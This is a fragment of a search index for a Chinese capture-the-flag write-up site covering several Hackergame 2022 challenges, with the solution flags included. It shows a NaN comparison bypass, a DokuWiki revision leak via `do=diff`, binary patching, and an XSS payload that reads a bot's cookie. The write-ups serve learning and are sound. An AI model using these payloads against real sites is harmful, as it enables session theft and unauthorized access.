<li>\u4ed4\u7ec6\u89c2\u5bdf\uff0c\u53ef\u4ee5\u53d1\u73b0\u7167\u7247\u7a7a\u4e2d\uff08\u767d\u8272\u4e91\u4e0a\u65b9\u4e2d\u95f4\u4f4d\u7f6e\uff09\u6709\u4e00\u67b6\u98de\u673a\u3002\u4f60\u80fd\u8c03\u67e5\u51fa\u8fd9\u67b6\u98de\u673a\u7684\u4fe1\u606f\u5417\uff1f\uff0c\u5305\u62ec \u8d77\u98de\u673a\u573a\uff08IATA \u673a\u573a\u7f16\u53f7\uff0c\u5982 PEK\uff09\u3001\u964d\u843d\u673a\u573a\uff08IATA \u673a\u573a\u7f16\u53f7\uff0c\u5982 HFE\uff09\u3001\u822a\u73ed\u53f7\uff08\u4e24\u4e2a\u5927\u5199\u5b57\u6bcd\u548c\u82e5\u5e72\u4e2a\u6570\u5b57\uff0c\u5982 CA1813\uff09</li> </ol> <p>\u505a\u8fd9\u9053\u9898\u7684\u65f6\u5019\u65f6\u95f4\u6b63\u597d\u662f\u4e0b\u5348\u4e94\u70b9\u4e8c\u5341\u591a\uff0c\u5bf9\u5e94\u65e5\u672c\u65f6\u95f4\u4e0b\u5348\u516d\u70b9\u4e8c\u5341\u591a\uff0c\u4e5f\u5c31\u662f\u7c7b\u4f3c\u62cd\u7167\u7684\u65f6\u95f4\uff0c\u5728\u5b9e\u65f6\u98de\u673a\u822a\u7ebf\u5730\u56fe\u4e2d\u6b63\u597d\u770b\u89c1\u6709\u4e00\u67b6\u98de\u673a\u5728\u8be5\u5904\u4e0a\u7a7a\uff0c\u8d77\u98de\u673a\u573a\u662f HND\u3002\u901a\u8fc7\u98de\u673a\u65b9\u5411\u53ef\u4ee5\u786e\u5b9a\u8d77\u98de\u673a\u573a\u5c31\u662f HND\u3002\u7136\u540e\u627e\u5230\u6bcf\u5929\u5927\u6982\u8fd9\u4e2a\u65f6\u95f4\u4ece HND \u51fa\u53d1\u5411\u5317\u7684\u98de\u673a\uff0c\u901a\u8fc7\u5c1d\u8bd5\u5f97\u5230\u964d\u843d\u673a\u573a\u4e3a HIJ\uff0c\u822a\u73ed\u53f7\u4e3a NH683\u3002\uff08\u4e5f\u53ef\u4ee5\u7206\u7834\uff0c\u8fd9\u9053\u9898\u7684\u9a8c\u9898\u903b\u8f91\u662f\u5c06\u8868\u5355\u7ed3\u679c\u8fdb\u884c base64\uff0c\u7136\u540e GET \u7ed3\u679c.txt\uff0c\u6b63\u786e\u5219 200 \u4e14\u91cc\u9762\u662f flag\uff0c\u9519\u8bef\u5219 404\uff09</p> <p>flag\uff1aflag{Buzz_0ver_y0ur_h34d_and_4DSB_m19ht_111egal}</p>"}, {"location": "writeups/hackergame2022/#_7", "title": "\u731c\u6570\u5b57", "text": "<p>\u8fd9\u4e2a\u5c0f\u6e38\u620f\u9700\u8981\u505a\u7684\u4e8b\u60c5\u975e\u5e38\u7b80\u5355\uff1a\u5728 0 \u548c 1 \u4e4b\u95f4\u731c\u4e00\u4e2a\u6570\u5b57\uff08\u7cbe\u786e\u5230\u5c0f\u6570\u70b9\u540e 6 \u4f4d\uff09\uff0c\u5e76\u901a\u8fc7\u53cd\u9988\u7684\u300c\u5927\u300d\u8fd8\u662f\u300c\u5c0f\u300d\u4fee\u6b63\u731c\u6d4b\uff0c\u76f4\u81f3\u5b8c\u5168\u731c\u4e2d\u3002\u4e00\u6b21\u6027\u547d\u4e2d\u7684\u6982\u7387\u663e\u7136\u4e5f\u662f\u4e00\u767e\u4e07\u5206\u4e4b\u4e00\uff08\u548c\u4e94\u8fb9\u5f62\u7684\u300c\u5ae9\u725b\u4e03\u65b9\u300d\u8fbe\u6210\u4e86\u67d0\u79cd\u610f\u4e49\u4e0a\u7684\u540c\u6784\uff09\u2014\u2014\u4f46\u4ece\u5b66\u9738\u5ba4\u53cb\u624b\u4e2d\u501f\u6765\u7684\u6982\u7387\u8bba\u4e0e\u7edf\u8ba1\u5b66\u7b14\u8bb0\u4e0a\u4e07\u5343\u516c\u5f0f\u7684\u6a21\u6837\u5728\u601d\u7eea\u4e2d\u4e00\u77ac\u800c\u8fc7\uff0c\u4e8e\u662f\u4f60\u9ed8\u9ed8\u7948\u7977\u7740\u5927\u6570\u5b9a\u7406\uff0c\u8654\u8bda\u5730\u6309\u4e0b\u4e86\u63d0\u4ea4\u7684\u6309\u94ae\u3002</p> <p>\u9898\u76ee\u7ed9\u51fa\u4e86\u7f51\u9875\u670d\u52a1\u7684 Java \u6e90\u7801\u3002\u672c\u6765\u60f3\u7740\u662f\u7206\u7834\u4f2a\u968f\u673a\u6570\uff0c\u4e0d\u8fc7\u6e90\u7801\u91cc\u7528\u7684\u662f SecureRandom\uff0c\u4e0d\u80fd\u7206\u7834\u3002\u7136\u540e\u4ed4\u7ec6\u770b\u6e90\u7801\u3002\u53d1\u73b0\u4e86\u4e00\u4e9b\u6bd4\u8f83\u53ef\u7591\u7684\u4e1c\u897f\uff0c\u660e\u660e\u6bd4\u8f83\u7684\u90fd\u662f\u516d\u4f4d\u5c0f\u6570\uff0c\u662f\u53ef\u4ee5\u4e58 1000000 \u7136\u540e\u5224\u65ad\u6574\u6570\u76f8\u7b49\u7684\uff0c\u4f46\u5b83\u504f\u8981\u6bd4\u8f83\u8f93\u5165\u548c\u4e24\u4e2a\u5c0f\u6570\u7684\u5927\u5c0f\uff08\u662f\u5426\u4e0d\u5927\u4e8e\u4e14\u4e0d\u5c0f\u4e8e\uff09\u3002\u800c\u5982\u679c\u8f93\u5165\u662f NaN\uff0c\u5219\u4efb\u4f55\u6bd4\u8f83\u90fd\u662f False\uff0c\u4e5f\u5c31\u8ba9\u7a0b\u5e8f\u8ba4\u4e3a\u8f93\u5165\u548c\u9884\u671f\u76f8\u7b49\u4e86\u3002</p> <p>\u4e0d\u8fc7\u56e0\u4e3a\u89c4\u5b9a\u4e86\u5c0f\u6570\uff0c\u6240\u4ee5 NaN \u5728\u524d\u7aef\u4e0d\u80fd\u76f4\u63a5\u5199\u5165\uff0c\u9700\u8981\u624b\u52a8 POST \u5230 <code>/state</code>\uff0c\u7528\u4e00\u4e2a\u4efb\u610f\u6570\u5b57\u8bd5\u4e00\u4e0b\uff0c\u53ef\u4ee5\u5728 DevTool \u91cc\u6355\u83b7\u5230 POST \u6570\u636e\u683c\u5f0f\u3002\u7136\u540e\u624b\u52a8 POST \u4e00\u4e2a &lt;state&gt;&lt;guess&gt;NaN&lt;/guess&gt;&lt;/state&gt; \u518d GET \u4e00\u4e0b\u5c31\u80fd\u5728\u8fd4\u56de\u6570\u636e\u4e2d\u770b\u5230 flag\uff1aflag{gu3ss-n0t-a-numb3r-1nst3ad-\u2026\u2026}</p>"}, {"location": "writeups/hackergame2022/#flag", "title": "Flag \u7684\u75d5\u8ff9", "text": "<p>\u5c0f Z \u542c\u8bf4 Dokuwiki \u914d\u7f6e\u5f88\u7b80\u5355\uff0c\u6240\u4ee5\u5728\u81ea\u5df1\u7684\u673a\u5668\u4e0a\u6574\u4e86\u4e00\u4efd\u3002\u53ef\u662f\u4e0d\u5de7\u7684\u662f\uff0c\u4ed6\u4e00\u4e0d\u5c0f\u5fc3\u628a\u73cd\u8d35\u7684 flag \u7c98\u8d34\u5230\u4e86 wiki \u9996\u9875\u63d0\u4ea4\u4e86\uff01\u4ed6\u8d76\u7d27\u6539\u597d\uff0c\u5e76\u4e14\u4e5f\u628a\u5386\u53f2\u8bb0\u5f55\uff08revisions\uff09\u529f\u80fd\u5173\u6389\u4e86\u3002</p> <p>\u300c\u8fd9\u6837\u5c31\u5e94\u8be5\u5c31\u4e0d\u4f1a\u6cc4\u6f0f flag \u4e86\u5427\u300d\uff0c\u5c0f Z \u5982\u662f\u5b89\u6170\u81ea\u5df1\u3002</p> <p>\u7136\u800c\u4e8b\u5b9e\u771f\u7684\u5982\u6b64\u5417\uff1f</p> <p>\uff08\u9898\u76ee Dokuwiki \u7248\u672c\u57fa\u4e8e 2022-07-31a \"Igor\"\uff09</p> <p>\u4e00\u4e2a Dokuwiki \u6846\u67b6\u642d\u7684\u7f51\u7ad9\uff0c\u76ee\u6807\u662f\u627e\u5230\u9996\u9875\u7684\u4fee\u6539\u3002\u7248\u672c\u662f\u6700\u65b0\u7684\uff0c\u641c\u4e0d\u5230\u5565\u6f0f\u6d1e\u3002\u81ea\u5df1\u90e8\u7f72\u4e86\u4e00\u4e0b\u73a9\u73a9\uff0c\u770b\u8d77\u6765 revisions \u7b49\u529f\u80fd\u5173\u6389\u4e4b\u540e\u786e\u5b9e\u6ca1\u6cd5\u770b\u4fee\u6539\u8bb0\u5f55\u4e86\u3002\u800c\u4e14\u9898\u76ee\u662f external edit\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u4fee\u6539\u4e86\u6587\u4ef6\uff0c\u800c\u6ca1\u6709\u901a\u8fc7\u7f51\u9875\u7f16\u8f91\u3002</p> <p>\u7136\u540e\u5c31\u8bfb\u4e86\u8bfb\u6e90\u7801\uff0c\u641c\u4e86\u4e0b issue \u770b\u5230\u4e86\u4e00\u4e2a revision \u76f8\u5173\u7684 https://github.com/splitbrain/dokuwiki/issues/3576\uff0c\u91cc\u9762\u63d0\u5230\u4e86 <code>?do=diff</code>\uff0c\u5c1d\u8bd5\u8bbf\u95ee <code>/doku.php?id=start&amp;do=diff</code>\uff0c\u786e\u5b9e\u80fd\u770b\u5230\u4fee\u6539\u8bb0\u5f55\uff0c\u5176\u4e2d flag\uff1aflag{d1gandFInD_d0kuw1k1_unexpectEd_API}</p>"}, {"location": "writeups/hackergame2022/#_8", "title": "\u5b89\u5168\u7684\u5728\u7ebf\u6d4b\u8bc4", "text": "<p>\u4f20\u8bf4\u79d1\u5927\u65b0\u7684\u5728\u7ebf\u6d4b\u8bc4\u7cfb\u7edf\uff08Online Judge\uff09\u6b63\u5728\u9510\u610f\u5f00\u53d1\u4e2d\u3002\u7136\u800c\uff0c\u65b0 OJ \u8fdf\u8fdf\u4e0d\u89c1\u8e2a\u5f71\uff0c\u65e7\u7684 OJ \u548c\u66f4\u65e7\u7684 OJ \u5374\u90fd\u5df2\u7ecf\u505c\u6b62\u4e86\u7ef4\u62a4\u3002\u67d0 2022 \u7ea7\u8ba1\u7b97\u673a\u7cfb\u7684\u65b0\u751f\u5c0f L \u7b49\u5f97\u4e0d\u8010\u70e6\u4e86\uff0c\u5f53\u5373\u8868\u793a\u4e0d\u5c31\u662f OJ \u5417\uff0c\u4ed6 10 \u5206\u949f\u5c31\u80fd\u5199\u51fa\u6765\u4e00\u4e2a\u3002</p> <p>\u65e0\u6cd5 AC \u7684\u9898\u76ee</p> <p>\u4e3a\u4e86\u9a8c\u8bc1\u4ed6\u5199\u7684\u65b0 OJ \u7684\u5b89\u5168\u6027\uff0c\u4ed6\u51b3\u5b9a\u5728 OJ \u4e0a\u51fa\u4e00\u9053\u4e0d\u53ef\u80fd\u5b8c\u6210\u7684\u9898\u76ee\u2014\u2014\u5927\u6574\u6570\u5206\u89e3\uff0c\u5e76\u4e14\u653e\u51fa\u8c6a\u8a00\uff1a\u53ea\u8981\u6709\u4eba\u80fd AC \u8fd9\u9053\u9898\uff0c\u5c31\u80fd\u5f97\u5230\u4f20\u8bf4\u4e2d\u7684 flag\u3002\u5f53\u7136\uff0c\u56e0\u4e3a\u76ee\u524d OJ \u53ea\u80fd\u8fd0\u884c C \u8bed\u8a00\u4ee3\u7801\uff0c\u5373\u4f7f\u8bf7\u6765\u4e00\u4f4d\u5c11\u5e74\u73ed\u5b66\u9662\u7684\u5929\u624d\u6050\u6015\u4e5f\u65e0\u6d4e\u4e8e\u4e8b\u3002</p> <p>\u52a8\u6001\u6570\u636e</p> <p>\u4e3a\u4e86\u9632\u6b62\u6570\u636e\u610f\u5916\u6cc4\u9732\uff0c\u5c0f L \u8fd8\u7ed9 OJ \u52a0\u5165\u4e86\u52a8\u6001\u6570\u636e\u751f\u6210\u529f\u80fd\uff0c\u6bcf\u6b21\u6d4b\u8bc4\u4f1a\u968f\u673a\u751f\u6210\u4e00\u90e8\u5206\u6d4b\u8bd5\u6570\u636e\u3002\u8fd9\u6837\uff0c\u5373\u4f7f OJ \u6d4b\u8bd5\u6570\u636e\u6cc4\u9732\uff0c\u653b\u51fb\u8005\u4e5f\u6ca1\u529e\u6cd5\u901a\u8fc7\u6240\u6709\u6d4b\u8bd5\u6837\u4f8b\u4e86\u5427\uff01\uff08\u4e5f\u8bb8\u5427\uff1f\uff09</p> <p>\u7b2c\u4e00\u9898\u5c31\u662f\u4f7f\u7528 ./data/static.in \u548c ./data/static.out \u4f5c\u4e3a\u8f93\u5165\u8f93\u51fa\u3002\u800c\u4e14\u4e5f\u6ca1\u6709\u8bbe\u7f6e\u6743\u9650\uff0c\u6240\u4ee5\u76f4\u63a5\u8bfb\u53d6 ./data/static.out \u5185\u5bb9\u5e76\u8f93\u51fa\u5373\u53ef\u3002flag\uff1aflag{the_compiler_is_my_eyes_b18ad6f041}</p> <p>\u7b2c\u4e8c\u9898\u52a8\u6001\u751f\u6210\u6570\u636e\uff0c\u800c\u4e14\u8bbe\u7f6e\u4e86\u6743\u9650\uff0c\u7528\u6237\u4e0d\u80fd\u8bfb\u53d6\uff0c\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u505a\u3002</p>"}, {"location": "writeups/hackergame2022/#_9", "title": "\u7ebf\u8def\u677f", "text": "<p>\u4e2d\u5348\u8d77\u5e8a\uff0c\u770b\u5230\u5ba4\u53cb\u7684\u684c\u5b50\u4e0a\u53c8\u591a\u4e86\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u76d2\u5b50\u3002\u5feb\u9012\u6807\u7b7e\u4e0a\u4e00\u5982\u65e2\u5f80\u7684\u5199\u7740\uff1a\u7ebf\u8def\u677f\u3002\u548c\u5f80\u5e38\u4e00\u6837\uff0c\u4f60\u201c\u5e2e\u201d\u5ba4\u53cb\u62c6\u5f00\u5feb\u9012\u5e76\u62a2\u5148\u628a\u677f\u5b50\u628a\u73a9\u4e00\u756a\u3002\u53ef\u662f\u7a81\u7136\uff0c\u4f60\u6ce8\u610f\u5230\u677f\u5b50\u8868\u9762\u4f3c\u4e4e\u5199\u7740\u4e9b\u4e1c\u897f\u2026\u2026\u770b\u8d77\u6765\u50cf\u662f\u2026\u2026flag\uff1f</p> <p>\u53ef\u662f\u53ea\u6709\u5f00\u5934\u7684\u51e0\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u770b\u6e05\u695a\u3002\u4f60\u4e00\u65f6\u95f4\u4e0d\u77e5\u6240\u63aa\u3002</p> <p>\u5e78\u8fd0\u7684\u662f\uff0c\u4f60\u901a\u8fc7\u76d2\u5b50\u4e0a\u7684\u8054\u7cfb\u65b9\u5f0f\u627e\u5230\u4e86\u5236\u4f5c\u5382\u5bb6\uff0c\u901a\u8fc7\u677f\u5b50\u4e1d\u5370\u4e0a\u7684\u5e8f\u5217\u53f7\u67e5\u51fa\u4e86\u5ba4\u53cb\u7684\u5e95\u7ec6\uff0c\u5e76\u4ee5\u653e\u5f03\u6bcf\u6708\u4e24\u6b21\u514d\u8d39 PCB \u6253\u6837\u5305\u90ae\u7684\u673a\u4f1a\u4e3a\u4ee3\u4ef7\u8981\u6765\u4e86\u8fd9\u6279\u5e26\u6709 flag \u7684\u677f\u5b50\u7684\u751f\u4ea7\u6587\u4ef6\u3002\u90a3\u8fd9\u4e9b\u6587\u4ef6\u91cc\u4f1a\u4e0d\u4f1a\u5305\u542b\u7740\u66f4\u591a\u6709\u5173 flag \u7684\u4fe1\u606f\u5462\uff1f</p> <p>\u7ed9\u4e86\u4e00\u4e9b gbr \u6587\u4ef6\uff0c\u641c\u4e86\u4e00\u4e0b\u7528 Gerbv \u6253\u5f00\u3002\u53d1\u73b0 flag \u76f8\u5173\u5185\u5bb9\u5728 F_Cu \u8fd9\u90e8\u5206\u4e0a\uff0c\u6709\u4e00\u4e9b\u5706\u73af\u906e\u6321\u4e86\uff0c\u70b9\u51fb\u53bb\u6389\u5c31\u53ef\u4ee5\u770b\u89c1 flag\uff1aflag{8_1ayER_rogeRS_81ind_V1a}</p> <p></p>"}, {"location": "writeups/hackergame2022/#flag_1", "title": "Flag \u81ea\u52a8\u673a", "text": "<p>Hackergame 2022 \u7ec4\u59d4\u4f1a\u4e3a\u5927\u5bb6\u642c\u6765\u4e86\u4e00\u53f0\u80fd\u591f\u81ea\u52a8\u83b7\u53d6 flag \u7684\u673a\u5668\u3002\u7136\u800c\uff0c\u60f3\u8981\u63d0\u53d6\u51fa\u5176\u4e2d\u7684 flag \u4f3c\u4e4e\u6ca1\u90a3\u4e48\u7b80\u5355\u2026\u2026</p> <p>\u4e00\u4e2a\u4f7f\u7528 Win32 API \u7684\u7a97\u53e3\u7a0b\u5e8f\u7684\u9006\u5411\u3002\u593a\u53d6 flag \u7684\u6309\u94ae\u70b9\u4e0d\u4e0a\u3002\u9006\u5411\u4e00\u4e0b\uff0c\u5728 WinMain \u51fd\u6570\u91cc\u770b\u5230\u6ce8\u518c\u4e86\u4e00\u4e2a\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\u5728 0x401510 \u5904\u3002\u679a\u4e3e\u4e86 msg \u7684\u503c\uff0c\u4e5f\u5c31\u662f\u4e8b\u4ef6\uff1a</p> <ul> <li>1\uff1a\u5373\u521b\u5efa\u7a97\u53e3\uff0c\u521b\u5efa\u4e86\u4e09\u4e2a\u6309\u94ae\uff0c\u4e00\u4e2a\u662f \u201c\u72e0\u5fc3\u593a\u53d6\u201d\uff0c\u5bf9\u5e94\u7684 hMENU \u4e3a 3\uff0c\u4e00\u4e2a \u201c\u653e\u624b\u79bb\u5f00\u201d\uff0chMENU \u4e3a 2\uff0c\u4e00\u4e2a\u6ca1\u6709\u663e\u793a\u4e0d\u7ba1</li> <li>0x111\uff1a\u5373\u70b9\u51fb\uff0c\u6b64\u65f6\u7684\u53c2\u6570 wParam\uff08\u5373 a3\uff09\u4e3a\u70b9\u51fb\u7684\u6309\u94ae\u7684 hMENU\uff0c\u5f53 a3 \u4e3a 2 \u65f6\u9000\u51fa\uff0ca3 \u4e3a 3 \u65f6\u68c0\u67e5 lParam \u662f\u5426\u4e3a 114514\uff0c\u5982\u679c\u662f\u5219\u8f93\u51fa flag \u5230\u6587\u4ef6\u4e2d</li> </ul> <p>\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u5728\u6c47\u7f16\u91cc patch \u4e00\u4e0b\u7a0b\u5e8f\uff0c\u5c06\u5224\u65ad a3 \u4e3a 2 \u6216 3 \u8c03\u6362\u4e00\u4e0b\uff0c\u7136\u540e\u518d\u5c06\u5224\u65ad lParam \u7684 jz \u53d8\u6210 jnz\u3002\u4e4b\u540e Apply\u3001\u8fd0\u884c\u70b9\u51fb\u653e\u624b\u79bb\u5f00\u5373\u53ef\u8f93\u51fa flag\uff1aflag{Y0u_rea1ly_kn0w_Win32API_\u2026\u2026}</p>"}, {"location": "writeups/hackergame2022/#_10", "title": "\u676f\u7a97\u9e45\u5f71", "text": "<p>\u8bf4\u5230\u4e0a\u56de\uff0c\u5c0f K \u5728\u83b7\u5f97\u4e86\u5b9e\u9a8c\u5ba4\u9ad8\u6027\u80fd\u670d\u52a1\u5668\u7684\u8bbf\u95ee\u6743\u9650\u4e4b\u540e\u5c31\u8fc1\u79fb\u4e86\u6570\u636e\uff08\u4ed6\u76f4\u5230\u73b0\u5728\u90fd\u8fd8\u4e0d\u77e5\u9053\u81ea\u5df1\u7684\u5bb6\u76ee\u5f55\u5907\u4efd\u88ab Eve \u4e0b\u8f7d\u4e86\uff09\u3002\u4e4b\u540e\uff0c\u4e3a\u4e86\u8dd1\u4e00\u4e9b\u522b\u4eba\u5199\u7684\u5728 Windows \u4e0b\u7684\u8ba1\u7b97\u7a0b\u5e8f\uff0c\u4ed6\u5b89\u88c5\u4e86 wine \u6765\u8fd0\u884c\u5b83\u4eec\u3002</p> <p>\u300c\u4f60\u7528 wine \u8dd1 Windows \u7a0b\u5e8f\uff0c\u8981\u662f\u4e2d\u6bd2\u4e86\u548b\u529e\uff1f\u300d</p> <p>\u300c\u6ca1\u5173\u7cfb\uff0c\u5927\u4e0d\u4e86\u628a wineprefix \u5220\u4e86\u5c31\u884c\u3002\u6211\u8bbe\u7f6e\u8fc7\u4e86\u78c1\u76d8\u6620\u5c04\uff0cWindows \u7a0b\u5e8f\u662f\u8bfb\u4e0d\u5230\u6211\u7684\u6587\u4ef6\u7684\uff01\u300d</p> <p>\u4f46\u679c\u771f\u5982\u6b64\u5417\uff1f</p> <p>\u4e3a\u4e86\u9a8c\u8bc1\u8fd9\u4e00\u70b9\uff0c\u4f60\u9700\u8981\u70b9\u51fb\u300c\u6253\u5f00/\u4e0b\u8f7d\u9898\u76ee\u300d\u6309\u94ae\uff0c\u4e0a\u4f20\u4f60\u7684\u7a0b\u5e8f\u5b9e\u73b0\u4ee5\u4e0b\u7684\u76ee\u7684\uff1a</p> <ol> <li>/flag1 \u653e\u7f6e\u4e86\u7b2c\u4e00\u4e2a flag\u3002\u4f60\u80fd\u7ed9\u51fa\u4e00\u4e2a\u80fd\u5728 wine \u4e0b\u8fd0\u884c\u7684 x86_64 \u67b6\u6784\u7684 Windows \u547d\u4ee4\u884c\u7a0b\u5e8f\u6765\u8bfb\u53d6\u5230\u7b2c\u4e00\u4e2a flag \u5417\uff1f</li> <li>/flag2 \u653e\u7f6e\u4e86\u7b2c\u4e8c\u4e2a flag\uff0c\u4f46\u662f\u9700\u8981\u4f7f\u7528 /readflag \u7a0b\u5e8f\u624d\u80fd\u770b\u5230 /flag2 \u7684\u5185\u5bb9\u3002\u4f60\u80fd\u7ed9\u51fa\u4e00\u4e2a\u80fd\u5728 wine \u4e0b\u8fd0\u884c\u7684 x86_64 \u67b6\u6784\u7684 Windows \u547d\u4ee4\u884c\u7a0b\u5e8f\u6765\u6267\u884c /readflag \u7a0b\u5e8f\u6765\u8bfb\u53d6\u5230\u7b2c\u4e8c\u4e2a flag \u5417\uff1f</li> </ol> <p>\u7b2c\u4e00\u4e2a flag \u4e5f\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u8bfb\u53d6 /flag1 \u8f93\u51fa\u5c31\u53ef\u4ee5\u4e86\u3002</p> <p>\u7b2c\u4e8c\u4e2a flag \u641e\u7684\u65f6\u5019\u8bd5\u8fc7 system\u3001execl \u5565\u7684\uff0c\u4e00\u4e9b\u547d\u4ee4\u90fd\u6ca1\u529e\u6cd5\u6267\u884c\uff0c\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u529e\uff0c\u4e0d\u60f3\u7814\u7a76\u4e86\uff0c\u5f00\u6446</p>"}, {"location": "writeups/hackergame2022/#_11", "title": "\u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60", "text": "<p>\u5c0f X \u4f5c\u4e3a\u67d0\u95e8\u7b26\u53f7\u8ba1\u7b97\u8bfe\u7a0b\u7684\u52a9\u6559\uff0c\u4e3a\u4e86\u8ba9\u5927\u5bb6\u719f\u6089\u8f6f\u4ef6\u7684\u4f7f\u7528\uff0c\u4ed6\u5199\u4e86\u4e00\u4e2a\u5c0f\u7f51\u7ad9\uff1a\u4e0a\u9762\u653e\u7740\u4e94\u9053\u7b80\u5355\u7684\u9898\u76ee\uff0c\u53ea\u8981\u8f93\u5165\u59d3\u540d\u548c\u9898\u76ee\u7b54\u6848\uff0c\u63d0\u4ea4\u540e\u5c31\u53ef\u4ee5\u770b\u5230\u81ea\u5df1\u7684\u5206\u6570\u3002</p> <p>\u70b9\u51fb\u6b64\u94fe\u63a5\u8bbf\u95ee\u7ec3\u4e60\u7f51\u7ad9\uff08\u6ca1\u94fe\u63a5\uff09</p> <p>\u60f3\u8d77\u81ea\u5df1\u524d\u51e0\u5929\u5728\u516c\u4f17\u53f7\u4e0a\u5b66\u8fc7\u7684 Java \u8bbe\u8ba1\u6a21\u5f0f\u514d\u8d39\u8bd5\u542c\u8bfe\uff0c\u672c\u7740\u524d\u540e\u7aef\u79bb\u5fc3\uff08\u54a6\uff1f\u662f\u524d\u540e\u7aef\u79bb\u5fc3\u5417\uff1f\u8fd8\u662f\u79bb\u5a5a\uff1f\u79bb\u3002\u3002\u79bb\u8c31\uff1f\u603b\u4e4b\u628a\u529f\u80fd\u80fd\u62c6\u5219\u62c6\u5c31\u5bf9\u5566\uff09\u7684\u601d\u60f3\uff0c\u5c0f X \u8fd8\u5355\u72ec\u5199\u4e86\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6b22\u8fce\u540c\u5b66\u4eec\u628a\u81ea\u5df1\u7684\u6210\u7ee9\u94fe\u63a5\u63d0\u4ea4\u4e0a\u6765\u3002</p> <p>\u603b\u4e4b\uff0c\u56e0\u4e3a\u5176\u5148\u8fdb\u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u9700\u8981\u540c\u5b66\u4eec\u505a\u5b8c\u7ec3\u4e60\u4e4b\u540e\u624b\u52a8\u628a\u6210\u7ee9\u8fde\u63a5\u8d34\u5230\u8fd9\u91cc\u6765\uff1a</p> <p>\u70b9\u51fb\u6b64\u94fe\u63a5\u63d0\u4ea4\u7ec3\u4e60\u6210\u7ee9 URL\uff08\u6ca1\u94fe\u63a5\uff09</p> <p>\u70b9\u8fdb\u7b2c\u4e00\u4e2a\u94fe\u63a5\uff0c\u968f\u4fbf\u505a\u4e00\u904d\uff0c\u5f97\u5230\u6210\u7ee9\u5206\u4eab\u9875\u9762 <code>/share?result=...</code>\uff0c\u7136\u540e\u5c06\u94fe\u63a5\u8d34\u5230\u7b2c\u4e8c\u4e2a\u94fe\u63a5\u91cc\uff0c\u4f1a\u81ea\u52a8\u8bfb\u53d6\u51fa\u540d\u5b57\u548c\u6210\u7ee9\u3002</p> <p>\u8bfb\u53d6\u7684\u8fc7\u7a0b\u662f\u7528 selenium \u6253\u5f00\u4e00\u4e2a\u6d4f\u89c8\u5668\uff0cGET login \u7136\u540e\u5c06 flag \u653e\u5165 cookie\uff0c\u5728 GET \u8f93\u5165\u7684 url\uff08\u4f1a\u66ff\u6362\u6389 netloc \u4e3a web\uff0cscheme \u4e3a http\uff09\uff0c\u7136\u540e\u8bfb\u53d6 #greeting \u548c #score \u7684\u5185\u5bb9\u3002</p> <p>\u518d\u770b\u7b2c\u4e00\u4e2a\u94fe\u63a5\uff0c\u5176 result \u662f\u53ef\u4ee5\u6784\u9020\u7684\uff0c\u76f8\u5173\u903b\u8f91\uff1a <pre><code>const queryString = window.location.search;\nconst urlParams = new URLSearchParams(queryString);\nconst result = urlParams.get('result');\nconst b64decode = atob(result);\nconst colon = b64decode.indexOf(\":\");\nconst score = b64decode.substring(0, colon);\nconst username = b64decode.substring(colon + 1);\n\ndocument.querySelector(\"#greeting\").innerHTML = \"\u60a8\u597d\uff0c\" + username + \"\uff01\";\ndocument.querySelector(\"#score\").innerHTML = \"\u60a8\u5728\u7ec3\u4e60\u4e2d\u83b7\u5f97\u7684\u5206\u6570\u4e3a &lt;b&gt;\" + score + \"&lt;/b&gt;/100\u3002\";\n</code></pre> \u4e5f\u5c31\u662f\u5c06 result base64 \u89e3\u7801\uff0c: \u524d\u9762\u7684\u4e3a\u5206\u6570\uff0c\u540e\u9762\u7684\u4e3a\u7528\u6237\u540d\uff0c\u7136\u540e\u586b\u5199\u8fdb\u53bb\u3002\u8fd9\u91cc\u5c31\u53ef\u4ee5\u8fdb\u884c xss\u3002\u6ca1\u5b66\u8fc7 xss\uff0c\u6240\u4ee5\u60f3\u4e86\u534a\u5929\u63d2\u5165\u4e00\u4e2a script tag \u4e4b\u540e\u600e\u4e48\u8ba9\u5904\u5728\u524d\u9762\u7684\u5b83\u88ab\u8fd0\u884c\uff0c\u540e\u6765\u641c\u4e86\u641c\u624d\u77e5\u9053\u53ef\u4ee5\u5229\u7528 onload onerror \u8fd9\u4e9b\u4e8b\u4ef6\u6765\u586b\u5199\u811a\u672c\u3002</p> <p>\u6240\u4ee5 payload \u5c31\u662f <code>100:&lt;img src=1 onerror=\"document.querySelector('#greeting').innerHTML=document.cookie\"&gt;</code>\uff0c\u7136\u540e base64 \u540e\u4f5c\u4e3a result \u4f20\u5165\uff0c\u518d\u4e22\u7ed9\u7b2c\u4e8c\u4e2a\u63d0\u4ea4\u94fe\u63a5\uff0c\u5f97\u5230 flag\uff1aflag{xS5_1OI_is_N0t_SOHARD_3c97784c1a}</p>"}, {"location": "writeups/hackergame2022/#_12", "title": "\u8499\u7279\u5361\u7f57\u8f6e\u76d8\u8d4c", "text": "<p>\u8fd9\u4e2a\u4f30\u7b97\u5706\u5468\u7387\u7684\u7ecf\u5178\u7b97\u6cd5\u4f60\u4e00\u5b9a\u542c\u8bf4\u8fc7\uff1a\u5f80\u4e00\u4e2a 1x1 \u5927\u5c0f\u7684\u65b9\u683c\u91cc\u968f\u673a\u6492 N \u4e2a\u70b9\uff0c\u7edf\u8ba1\u843d\u5728\u4ee5\u65b9\u683c\u67d0\u4e2a\u9876\u70b9\u4e3a\u5706\u5fc3\u30011 \u4e3a\u534a\u5f84\u7684 1/4 \u6247\u5f62\u533a\u57df\u4e2d\u6492\u843d\u7684\u70b9\u6570\u4e3a M\uff0c\u90a3\u4e48 M/N \u5c31\u5c06\u63a5\u8fd1\u4e8e \u03c0/4 \u3002</p> 